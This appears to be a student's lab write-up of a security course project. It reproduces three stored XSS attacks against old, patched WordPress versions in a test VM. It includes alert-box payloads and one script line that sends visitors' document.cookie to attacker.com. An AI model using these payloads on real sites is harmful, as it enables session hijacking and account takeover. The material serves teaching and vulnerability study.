# Week-7-Project-WordPress-vs.-Kali


[!] Title: WordPress <= 4.2 - Unauthenticated Stored Cross-Site Scripting (XSS) <br>
    Reference: https://www.exploit-db.com/exploits/36844/
[i] Fixed in: 4.2.1
If triggered by a logged-in administrator, under default settings the attacker can leverage the vulnerability to 
execute arbitrary code on the server via the plugin and theme editors.
  <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px x
<img src="https://i.imgur.com/kKKLoZh.gif" width="800">


[!] Title: WordPress <= 4.2.3 - Widgets Title Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8131
[i] Fixed in: 4.2.4
Top 10 2013-A3-Cross-Site Scripting (XSS)
https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)
If the attacker could trick the admin to post this as a comment:
(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("'><script>document.location= 'http://www.attacker.com/cgi-bin/cookie.cgi ?foo='+document.cookie</script>'.") + "'>";
we would get a working XSS exploit that would forward wpdistillery.vm visitors to attacker.com
<img src="https://i.imgur.com/3mrNRXU.gif" width="800">


[!] Title: WordPress  4.0-4.7.2 - Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds
    Reference: https://blog.sucuri.net/2017/03/stored-xss-in-wordpress-core.html
This issue was patched in WordPress 4.7.3.
If the attacker could trick the admin to post this as a comment:
<embed src='https://youtube.com/embed/12345\x3csvg onload=alert(1)\x3e'></embed>
we could get a stored XSS exploit.
<img src="https://i.imgur.com/msRn9YG.gif" width="800">

